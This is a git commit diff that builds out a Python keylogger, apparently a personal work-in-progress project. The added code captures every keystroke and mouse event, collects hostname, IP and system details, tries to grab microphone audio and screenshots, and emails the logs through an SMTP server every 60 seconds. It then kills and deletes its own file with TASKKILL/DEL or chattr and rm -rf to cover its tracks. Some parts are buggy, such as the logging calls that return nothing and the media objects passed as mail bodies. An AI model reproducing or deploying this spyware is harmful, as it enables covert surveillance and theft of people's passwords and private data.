38fef78c080ac272849271736fac16bcd85de85d
Shei <72736290+fullMoonShade@users.noreply.github.com>
2024-09-14 21:28:23 +0600

    Update later

--- inprogress.py
+++ inprogress.py
@@ -14,11 +14,9 @@ from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import glob
+from smtplib import SMTPAuthenticationError
 
-
-
-emailAddress = "Input your E-mail username here..." # Your Email Address Goes Here
-emailPassword = "Input your E-mail password here..." # Your Email Password Goes here
+sendReportEvery = 60 # Unit = Seconds // Change if necessary 
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
@@ -30,31 +28,118 @@ class KeyLogger:
     def appendlog(self, string):
         self.log = self.log + string
     
-     def on_move(self, x, y):
-            current_move = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_move)
+    def on_move(self, x, y):
+        current_move = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_move)
 
-        def on_click(self, x, y):
-            current_click = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_click)
+    def on_click(self, x, y):
+        current_click = logging.info("Mouse clicked at {} {}".format(x, y))
+        self.appendlog(current_click)
 
-        def on_scroll(self, x, y):
-            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_scroll)
+    def on_scroll(self, x, y):
+        current_scroll = logging.info("Mouse scrolled at {} {}".format(x, y))
+        self.appendlog(current_scroll)
 
-        def save_data(self, key):
+    def save_data(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space: 
+                current_key = "SPACE"
+            elif key == key.esc:
+                current_key = "ESC"
+            else:
+                current_key = " " + str(key) + " "
+        self.appendlog(current_key)
+
+    def send_mail(self, email, password, message):
+        sender = email
+        receiver = email
+
+        m = f"""\
+        Subject: Keylogger Report
+        To: {receiver}
+        From: {sender}
+        
+        {message}
+        """
+
+        try:                                # Port can be changed to --> 25, 465, 587 or 2525
+            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+                server.login(email, password)
+                server.sendmail(sender, receiver, m)
+                print("Email sent successfully.")
+        except SMTPAuthenticationError:
+             print("Failed to login. Invalid email or password.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+    def report(self):
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def system_information(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+        self.appendlog(hostname)
+        self.appendlog(ip)
+        self.appendlog(plat)
+        self.appendlog(system)
+        self.appendlog(machine)
+
+    def microphone(self):
+        fs = 44100
+        seconds = sendReportEvery
+        obj = wave.open('sound.wav', 'w')
+        obj.setnchannels(1)
+        obj.setsampwidth(2)
+        obj.setframerate(fs)
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        obj.writeframesraw(myrecording)
+        sd.wait()
+
+        self.send_mail(self.email, self.password, message=obj)
+
+    def screenshot(self):
+        img = pyscreenshot.grab()
+        self.send_mail(self.email, self.password, message=img)
+
+    def run(self):
+        keyboard_listener = keyboard.Listener(on_press=self.save_data)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+            mouse_listener.join()
+        if os.name == "nt":
             try:
-                current_key = str(key.char)
-            except AttributeError:
-                if key == key.space: 
-                    current_key = "SPACE"
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
-            
-            
-            self.appendlog(current_key)
+                pwd = os.path.abspath(os.getcwd())
+                os.system("cd " + pwd)
+                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+                print('File was closed.')
+                os.system("DEL " + os.path.basename(__file__))
+            except OSError:
+                print('File is closed.')
 
-        def send_mail(self, email, password, message):
-            
+        else:
+            try:
+                pwd = os.path.abspath(os.getcwd())
+                os.system("cd " + pwd)
+                os.system('pkill leafpad')
+                os.system("chattr -i " +  os.path.basename(__file__))
+                print('File was closed.')
+                os.system("rm -rf " + os.path.basename(__file__))
+            except OSError:
+                print('File is closed.')
+
+emailAddress = input("Enter your mailtrap username: ")
+emailPassword = input("Enter your mailtrap password: ")
+
+final_product = KeyLogger(sendReportEvery, emailAddress, emailPassword)
+
+final_product.run()
